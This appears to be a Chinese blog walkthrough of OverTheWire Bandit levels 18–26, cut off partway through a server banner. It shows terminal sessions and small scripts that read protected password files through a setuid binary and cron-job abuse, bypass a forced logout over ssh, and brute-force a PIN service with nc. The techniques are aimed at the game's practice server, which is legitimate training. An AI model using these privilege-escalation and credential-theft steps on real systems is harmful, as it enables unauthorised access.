Z84471LxMWArPnxJGsMmvvl2qCcBXZ7M CExYI7LMdZLSj9AiFp8rutQY6uIcqdfx lC1IFZxlnj05ZuWKY5Ytad9bTZ0eMgYC 4OfOZR4CMqlUFgxw8nZbKtW3eJcZPrqn bbctuDOWMvYUCWAiY7APEUnYPUo0zYiT sCepFVPJBglEuU8uY0LllG1oIJ2HOvrH o9sp7odH3blIlshg2aCrWPdzuDq5lxx5 97Vd3224QGOfsPGwjURphDfn7ISeXd3S Tz97n5taD1ZskKSlC1WHDU1CZZ5I3PnM NDkYNzqHAZnjn7GoKk6kUjmBwLbZ5IjT pd1THzlzKbAnR9uPnI75EpXdZVUFyVD9 GGwbSfJpRjzYvNHb1n2riVU3VnxCSe9I qLufXtxv2XKcjrWDqIojlINiJhU9LYCp kpxAYarBToFo4Vsr1jDBQREvRtbUA9i2 s8ZEkk0YuNoA9YnyUvVwFy29cMIP4psJ m0q33SCpHDBfTL2yRb8Db2lb6qIX8hjf xhHqvStzyrj0k1eLNbiQHmadzlY80iZg FExGbU63PyeJsfxtoIaVjiFKXAhEon0C 04y09Cd0CvZBSnrC1BjauTj70D3P84Gw Kr58zsSpmfKy4ILtUqbo2hqooPHnI13L ruisEF4OA3MyOdLEFwVdW84ZwJXRioRT kN2hWkHUehtqqWpnZW1CulYiOv8RJwPl V045YMJnMGdta9yQD8ALdny0hholXmdw gZ5U640FLMMChheWKHNdaQ1lKzLuqjxZ Al0xVJb5bEzhnFG8nPFe6IJa2FjXVSzo CT2ZJy6MoLkTqdHuhL5zUIsW41WCntAA kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd 46lUvvv0JJzyY0IOhWgGp5IjfsllmvaC FcSd4Me936rwbk2pAU9ylx9NXTrzdCaX vfU4mCzATtqUMNLg3a7mPs3OY6Dr4jaZ mOWgkKPfjXibrdfgG57CWMcbeqBRg4IU VudOaCtkUbhOdF7dE7KACOqH0R9weDhQ vzwsuF0cp5IrmEmGb7qNr4VUlsLi463t ymAqpKh2CPdC7iqFk4KcKdlXeKZqSrhW ta02hN70k7BoxfiVn7viAFoWKaGDOKnC bPLvqxn5BDtg4wy8c2uO0x7y3yi3RPMU VUcDEAfnRTt8nTlAd55q94L6rr0jfCCU QAIDBC5fx4bBOsyOd8NYItiPWGMaGXY9 X1NUQJrIsrNfaGHMUolOcepDiNss842e DAL411ARIMja2B3VibQxzNn8iqxCvtPB Gq0BvsinoaBAuqwLJwtWCSe1wMdiSBSZ RVO0eC5aK1WRlpKqPAglNSOPwc1OvUp8 XCBD77G8bknfL90F44o0Nbe1jqCBvxqh qOZOpK7UHdGgsZeQirx8wr9omjopkzuP nQ1IO5OUcJ4P8ZSrLYNQLFnWS32AMUcE oUpDAclcfOrSI10qeUCHqxvSxR0aXyrN uzPVdEpMDIvTBj3eB4mgmhEeCg1WEFqL WThihtgEnlmNQ6SAqROgERjyxNfgJZk5 l9sPHyleBjYNlZxQbHiCKNoeEfL7W3RA qfcmi6vHWL5CS7nqkHTcSdeRIoxDEGjU cI4zMnmzAP4Ei6FvZQ4vgvUhrhKYajGH MlKrQsbeU3cvq0GNIvwSMipBFUCHRLb4 yqPoTs4J1oNw6KqREjqQk1fXNxAtQzNN 6HgQNDvsu4VC7KBhIpQRCIRhLo4izRjG nPhoiXgdg3T385gjubCcKtnEa2kSQYiF BBWqlFI2IycHpCSESbmi8bgQ3XaRVkH9 zC5qgaooKVu5QNTtqEXcgPpmX2IXZcd5 BP8DJZaleBMYuyMzG96xJ6RDk6QUvLoi NsYnz4oTlDRKsDyWWVvseAeLnrVz80ul 2MVRp5Pej7Ngv3QlcfY9MhFrpm1EER3U niQz99Dp18DDLdpkqxatJEorlEuxbffD 0LZ5juRJ7Kpn9Y1d2tnXjZY5Qe5YsoSn DFkA6xfENw4qcgbyJOR1Lq4wHzoEzXf1 DuyGtXuifUSHgURCvn8wW8ZVGkMFEwCG lsp7PdEBOlGtgQaiZA1BMdxpHPA0YPCt fZPxMUd4y9F8Ty8W36yMVQRVxJ7M1n4B rNnhvIf0O32W7YkNFetirVBSHpxx8PVa IAvk989y4J29tuDjZlSUAcQJ0GKlSLA7 6h32PPx4KHY0pxOVSViJDOzjaidS79i5 3bCdLIIpnsFeobeQnORAVeM7dwvlRhYc VlaVTJjuHSNlmnukU27pLKfjQDcpFm0R jVxCHhuF6NHsDa6UdNHgBdNIDH7SZzCE tY71skfE2Y1Tez1451HdcwjueU9wWO9S JUplInoYI9VmMuoTU64WX9fQgljz0SRr YCScjMB7OB5QL8ZiPgyd7wRqlsqhjjGu 3fBUnc3gvyg7iyW1V4D0quYJPM3iNNy4 mrbw5khrpkAXdNfkTs6Eqzj8Am07I4CK crz9kBtBVlvTVZnvJ3AqfeFYuw89koZh uD036o50sDvVj9JU0ZMi76np4kE2SLw6 6QX3T8Ul4qgruVmX0Vx8h7H8GkTyAoZ1 EbdKERioX8ShHYhFCIFVIyvP13kL75jA QyRSUG1osue0Rrc114FF98YH7HjJWPgJ jMxInIjNK0ChvSQX10862VqCwIQsek95 2pqtLZiT8CzsalDfnn68FjdhbtgqEK1C 80JH1LNM5JFed5XQBVYeiKU5qNNqDjLS bandit17@bandit:~$ diff passwords.old passwords.new 42c42 \u003c hlbSBPAWJmL6WFDb06gpTx1pPButblOA --- \u003e kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd bandit17@bandit:~$   这么长肯定不可能用肉眼去代替机器做的事嘛\n所以就用到了diff命令\n\u003c为第一个文件，\u003e 为第二个文件，因此flag为kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\nlevel 19 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  bl@bl-virtual-machine:~/wargame$ ssh bandit18@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: #kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! Enjoy your stay! Byebye ! Connection to bandit.labs.overthewire.org closed. bl@bl-virtual-machine:~/wargame$  由上一关提示已经知道了，我们会看到byebye，直接看题目\n.bashrc会禁止所有通过ssh登陆的\n 仅作了解，错误方向\nhttps://blog.csdn.net/luoluonuoyasuolong/article/details/88806211\n 一种方法是利用命令拼接，将命令作为参数传过去，在执行shell之前运行\n1 2 3 4 5 6  bl@bl-virtual-machine:~/wargame$ ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat ./readme' This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x   第二种方式利用scp命令绕过\n1 2 3 4 5 6 7 8  bl@bl-virtual-machine:~/wargame$ scp -P 2220 bandit18@bandit.labs.overthewire.org:./readme ./readme This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: readme 100% 33 0.0KB/s 00:00 bl@bl-virtual-machine:~/wargame$ cat ./readme IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x bl@bl-virtual-machine:~/wargame$   顺便爬下了他的.bashrc文件，这道题的万恶之源\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116  # ~/.bashrc: executed by bash(1) for non-login shells. # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) # for examples # If not running interactively, don't do anything case $- in *i*) ;; *) return;; esac # don't put duplicate lines or lines starting with space in the history. # See bash(1) for more options HISTCONTROL=ignoreboth # append to the history file, don't overwrite it shopt -s histappend # for setting history length see HISTSIZE and HISTFILESIZE in bash(1) HISTSIZE=1000 HISTFILESIZE=2000 # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize # If set, the pattern \"**\" used in a pathname expansion context will # match all files and zero or more directories and subdirectories. #shopt -s globstar # make less more friendly for non-text input files, see lesspipe(1) #[ -x /usr/bin/lesspipe ] \u0026\u0026 eval \"$(SHELL=/bin/sh lesspipe)\" # set variable identifying the chroot you work in (used in the prompt below) if [ -z \"${debian_chroot:-}\" ] \u0026\u0026 [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot) fi # set a fancy prompt (non-color, unless we know we \"want\" color) case \"$TERM\" in xterm-color|*-256color) color_prompt=yes;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt #force_color_prompt=yes if [ -n \"$force_color_prompt\" ]; then if [ -x /usr/bin/tput ] \u0026\u0026 tput setaf 1 \u003e\u0026/dev/null; then # We have color support; assume it's compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt=yes else color_prompt= fi fi if [ \"$color_prompt\" = yes ]; then PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ' else PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ ' fi unset color_prompt force_color_prompt # If this is an xterm set the title to user@host:dir case \"$TERM\" in xterm*|rxvt*) PS1=\"\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1\" ;; *) ;; esac # enable color support of ls and also add handy aliases if [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors \u0026\u0026 eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\" alias ls='ls --color=auto' #alias dir='dir --color=auto' #alias vdir='vdir --color=auto' #alias grep='grep --color=auto' #alias fgrep='fgrep --color=auto' #alias egrep='egrep --color=auto' fi # colored GCC warnings and errors #export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01' # some more ls aliases #alias ll='ls -l' #alias la='ls -A' #alias l='ls -CF' # Alias definitions. # You may want to put all your additions into a separate file like # ~/.bash_aliases, instead of adding them here directly. # See /usr/share/doc/bash-doc/examples in the bash-doc package. if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases fi # enable programmable completion features (you don't need to enable # this, if it's already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fi fi echo 'Byebye !' exit 0   level 20  关于setuid：https://blog.csdn.net/oo__yan/article/details/7076889\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104  bandit19@bandit:~$ ls bandit20-do bandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do id bandit19@bandit:~$ strings bandit20-do /lib/ld-linux.so.2 libc.so.6 _IO_stdin_used exit execv printf __libc_start_main __gmon_start__ GLIBC_2.0 PTRh0 QVhk UWVS t$,U [^_] Run a command as another user. Example: %s id /usr/bin/env ;*2$\" GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516 crtstuff.c __JCR_LIST__ deregister_tm_clones __do_global_dtors_aux completed.6587 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry bandit20.c __FRAME_END__ __JCR_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini __x86.get_pc_thunk.bx printf@@GLIBC_2.0 _edata __data_start __gmon_start__ exit@@GLIBC_2.0 __dso_handle _IO_stdin_used __libc_start_main@@GLIBC_2.0 execv@@GLIBC_2.0 __libc_csu_init _fp_hw __bss_start main __TMC_END__ .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .jcr .dynamic .got.plt .data .bss .comment bandit19@bandit:~$./bandit20-do Run a command as another user. Example: ./bandit20-do id bandit19@bandit:~$./bandit20-do id uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19) bandit19@bandit:~$ls -al total 28 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rwsr-x--- 1 bandit20 bandit19 7296 Oct 16 2018 bandit20-do -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit19@bandit:~$./bandit20-do whoami bandit20 bandit19@bandit:~$./bandit20-do cat /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0j bandit19@bandit:~$  这一关涉及到的是linux权限的相关知识。/etc/bandit_pass/bandit20的所有者为bandit20，而其权限设置使得只有自身和bandit20这个group的成员能够读取。\nsetuid这个文件的拥有者为bandit20，而bandit19，也就是当前登录用户有执行的权限。而该文件有s权限，即setuid权限。能够在程序中调用setuid()系统调用，将自身的suid改成与euid相同，也就是在运行中作为bandit20执行命令。\n对于手头的这个文件，只要将欲执行的命令作为参数传入即可。\n这样的文件如果能够通过一定方式执行命令甚至于获得shell，是渗透人员理想的提权途径。\nlevel 21 题目的意思是有一个setuid的执行文件，他会和localhost的给定端口建立连接，然后他会从连接中读取一行信息，将其和前一关的flag对比，正确就会返回flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  bandit20@bandit:~$ ls -al total 32 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile -rwsr-x--- 1 bandit21 bandit20 12088 Oct 16 2018 suconnect bandit20@bandit:~$ ./suconnect Usage: ./suconnect \u003cportnumber\u003e This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back. bandit20@bandit:~$ nc -lp 2333 \u003c /etc/bandit_pass/bandit20 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr bandit20@bandit:~$   利用nc监听端口即可做到\n1 2 3 4 5 6 7  bandit20@bandit:~$ bandit20@bandit:~$ ls suconnect bandit20@bandit:~$ ./suconnect 2333 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Password matches, sending next password bandit20@bandit:~$   level 22 这关原以为是让了解crontab的用法，没想到看执行文件干了什么就得到了flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  bandit21@bandit:~$ cat /etc/bandit_pass/bandit21 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr bandit21@bandit:~$ ls /etc/cron.d/ atop cronjob_bandit22 cronjob_bandit23 cronjob_bandit24 bandit21@bandit:~$ cat /etc/cron.d/atop PATH=/bin:/usr/bin:/sbin:/usr/sbin # daily restart of atop at midnight 0 0 * * * root if [ -d \"/run/systemd/system\" ]; then systemctl restart atop; else /usr/share/atop/atop.daily \\\u0026 ; fi bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh \u0026\u003e /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh \u0026\u003e /dev/null bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 \u003e /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ cat /usr/bin/cronjob_bandit23.sh cat: /usr/bin/cronjob_bandit23.sh: Permission denied bandit21@bandit:~$ crontab -l crontabs/bandit21/: fopen: Permission denied bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI   level 23  https://www.linuxidc.com/Linux/2019-03/157335.htm\n其他的：\nhttps://blog.csdn.net/long2746004900/article/details/53367353\nhttps://blog.csdn.net/zhongqi2513/article/details/78613768\n 这关的核心还是阅读shell文件\n题目也十分温馨的提醒了，若是不懂可以运行运行debug\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  bandit22@bandit:~$ ls /etc/cron.d atop cronjob_bandit22 cronjob_bandit23 cronjob_bandit24 bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh \u0026\u003e /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh \u0026\u003e /dev/null bandit22@bandit:~$ cat /usr/bin/cron cronjob_bandit22.sh cronjob_bandit24.sh cronjob_bandit23.sh crontab bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \"Copying passwordfile /etc/bandit_pass/$mynameto /tmp/$mytarget\" cat /etc/bandit_pass/$myname \u003e /tmp/$mytarget bandit22@bandit:~$ echo I am user $myname | md5sum | cut -d ' ' -f 1 7db97df393f40ad1691b6e1fb03d53eb bandit22@bandit:~$ cat /tmp/7db97df393f40ad1691b6e1fb03d53eb Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI bandit22@bandit:~$ whoami bandit22 bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh \u0026\u003e /dev/null bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3 bandit22@bandit:~$ ls -al /usr/bin/cronjob_bandit23.sh -rwxr-x--- 1 bandit23 bandit22 211 Oct 16 2018 /usr/bin/cronjob_bandit23.sh bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n bandit22@bandit:~$   但是这里有个坑，忽然发现得到的flag和上次一样，注意到该sh是bandit23所执行的，属于bandit22组，所以用户名应该是bandit23\n最后查询的flag进入下一关\nlevel 24 老套路，打开sh阅读源码\n这是一个能运行并删除某个文件夹里所有脚本文件的脚本（这里用到timeout去执行任何文件\n所以我们需要自己写一个脚本去获取密码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 @reboot bandit24 /usr/bin/cronjob_bandit24.sh \u0026\u003e /dev/null * * * * * bandit24 /usr/bin/cronjob_bandit24.sh \u0026\u003e /dev/null bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname echo \"Executing and deleting all scripts in /var/spool/$myname:\" for i in * .*; do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" timeout -s 9 60 ./$i rm -f ./$i fi done bandit23@bandit:~$ ls -al /usr/bin/cronjob_bandit24.sh -rwxr-x--- 1 bandit24 bandit23 253 Oct 16 2018 /usr/bin/cronjob_bandit24.sh bandit23@bandit:~$ ls /var/spool/bandit24 ls: cannot open directory '/var/spool/bandit24': Permission denied bandit23@bandit:~$ ls /var/spool/ bandit24 cron mail rsyslog bandit23@bandit:~$ ls /var/spool/ -al total 1348 drwxr-xr-x 5 root root 4096 Oct 16 2018 . drwxr-xr-x 11 root root 4096 Oct 16 2018 .. drwxrwx-wx 37 root bandit24 1359872 Feb 16 10:41 bandit24 drwxr-xr-x 3 root root 4096 Oct 16 2018 cron lrwxrwxrwx 1 root root 7 Oct 16 2018 mail -\u003e ../mail drwx------ 2 root root 4096 Jan 14 2018 rsyslog bandit23@bandit:~$ ls bandit23@bandit:~$ touch fuck.sh touch: cannot touch 'fuck.sh': Permission denied bandit23@bandit:~$ touch /tmp/bandit23/fuck.sh bandit23@bandit:~$ ls -al /tmp/bandit23/ total 305956 drwxrwxrwx 7 bandit23 root 4096 Feb 16 10:56 . drwxrws-wt 1 root root 313204736 Feb 16 10:57 .. -rw-r--r-- 1 bandit23 bandit23 0 Feb 16 10:56 fuck.sh -rw-r--r-- 1 bandit24 bandit24 1 Feb 14 16:05 out -rw-r--r-- 1 bandit24 bandit24 0 Feb 14 16:49 output -rw-r--r-- 1 bandit24 bandit24 66 Feb 14 20:48 pass drwxr-xr-x 3 bandit27 bandit27 4096 Feb 7 13:12 repo drwxr-xr-x 3 bandit28 bandit28 4096 Feb 7 13:21 repo28 drwxr-xr-x 4 bandit29 bandit29 4096 Feb 7 13:28 repo29 drwxr-xr-x 3 bandit30 bandit30 4096 Feb 7 13:29 repo30 drwxr-xr-x 3 bandit31 bandit31 4096 Feb 7 13:55 repo31 -rwxrwxrwx 1 bandit23 bandit23 99 Feb 15 17:49 shell.sh bandit23@bandit:~$ vim /tmp/bandit23/fuck.sh bandit23@bandit:/tmp/bandit23$ cat fuck.sh #!/bin/bash cat /etc/bandit_pass/bandit24 \u003e\u003e /tmp/bandit23/bandit23_pass bandit23@bandit:~$ chmod +x /tmp/bandit23/fuck.sh bandit23@bandit:~$ bandit23@bandit:~$ cd /tmp/bandit23 bandit23@bandit:/tmp/bandit23$ ls fuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.sh bandit23@bandit:/tmp/bandit23$ cp fuck.sh /var/spool/bandit24/fuck.sh bandit23@bandit:/tmp/bandit23$ ls fuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.sh bandit23@bandit:/tmp/bandit23$ ls fuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.sh bandit23@bandit:/tmp/bandit23$ ls fuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.sh bandit23@bandit:/tmp/bandit23$ ls bandit23_pass out pass repo28 repo30 shell.sh fuck.sh output repo repo29 repo31 bandit23@bandit:/tmp/bandit23$ cat bandit23_pass UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ bandit23@bandit:/tmp/bandit23$   level 25 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65  bandit24@bandit:~$ telnet localhost 30002 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1 Timeout. Exiting. Connection closed by foreign host. bandit24@bandit:/tmp/bandit24$ nc localhost 30002 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5201 Wrong! Please enter the correct pincode. Try again. UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1213 Wrong! Please enter the correct pincode. Try again. ^C bandit24@bandit:~$ cd /tmp/bandit24 bandit24@bandit:/tmp/bandit24$ ls bandit24.sh counters.txt pass pin_mod.py pktempdir tcol bandit25.sh getpass.sh pass24.sh pin.py qsd.txt test.txt bash_file.sh mine.sh password.txt pins script.sh wesh.sh bandit24@bandit:/tmp/bandit24$ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ -bash: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ: command not found bandit24@bandit:/tmp/bandit24$ nc localhost 30002 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Fail! You did not supply enough data. Try again. UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1 ^C bandit24@bandit:/tmp/bandit24$ ls bandit24.sh fuck24.sh pass24.sh pins tcol bandit25.sh getpass.sh password.txt pktempdir test.txt bash_file.sh mine.sh pin_mod.py qsd.txt wesh.sh counters.txt pass pin.py script.sh bandit24@bandit:/tmp/bandit24$ python Python 2.7.13 (default, Sep 26 2018, 18:42:22) [GCC 6.3.0 20170516] on linux2 Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. \u003e\u003e\u003e exit() bandit24@bandit:/tmp/bandit24$ touch fuck24.py bandit24@bandit:/tmp/bandit24$ vim fuck24.py bandit24@bandit:/tmp/bandit24$ touch pass24 bandit24@bandit:/tmp/bandit24$ cat fuck24.py # !/usr/bin/env python f = open('pass24','w') passwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ' for i in range(10000): flag = passwd + ' ' + str(i).zfill(4) + '\\n' f.write(flag) f.close() bandit24@bandit:/tmp/bandit24$ python fuck24.py bandit24@bandit:/tmp/bandit24$ less pass24 bandit24@bandit:/tmp/bandit24$ nc localhost 30002 \u003c pass24 \u003e ans.txt bandit24@bandit:/tmp/bandit24$ sort ans.txt | uniq -u Correct! Exiting. I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG bandit24@bandit:/tmp/bandit24$   简单来说，有一个程序在监听30002端口，接收$bandit24_pass pin，需要我们爆破pin\n这边利用python生成pass24字典\n1 2 3 4 5 6 7 8 9  # !/usr/bin/env python f = open('pass24','w') passwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ' for i in range(10000): flag = passwd + ' ' + str(i).zfill(4) + '\\n' f.write(flag) f.close()   然后通过nc localhost 30002 \u003c pass24 \u003e ans.txt命令将其传给守护程序，返回结果存入ans.txt\n然后再ans.txt中找出不一样的即可\n//TODO：后续想用单纯的shell脚本跑一波\nlevel26 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168  bandit25@bandit:~$ ls bandit26.sshkey bandit25@bandit:~$ ssh bandit26@localhost -i bandit26.sshkey Could not create directory '/home/bandit25/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\  ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\  \\; : . | ' ' ' : `----' | | \\  ; ` | ' ; \\; / | ' : ; . \\  .\\  ; \\  \\  ', / | | ' \\  \\  ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT 